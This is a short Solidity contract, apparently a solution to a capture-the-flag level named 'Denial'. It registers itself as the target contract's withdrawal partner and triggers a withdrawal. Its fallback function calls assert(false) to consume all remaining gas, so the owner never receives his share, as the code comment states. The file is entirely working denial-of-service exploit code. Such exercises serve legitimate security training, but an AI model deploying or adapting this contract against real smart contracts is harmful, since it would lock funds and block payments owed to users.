// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "hardhat/console.sol";
contract DenialHelper {
    DenialAbstract denialContract;
    constructor(address payable _address) {
        denialContract = DenialAbstract(_address);
    }

    function withdraw() public {
        denialContract.setWithdrawPartner(address(this));
        denialContract.withdraw();
    }
    fallback() external payable{
        // assert will cause the transaction to fail and consume remaining gas, so the
        // owner can't get paid his portion
        assert(false);
    }
}

abstract contract DenialAbstract {
    function setWithdrawPartner(address) public virtual;
    function withdraw() public virtual;
}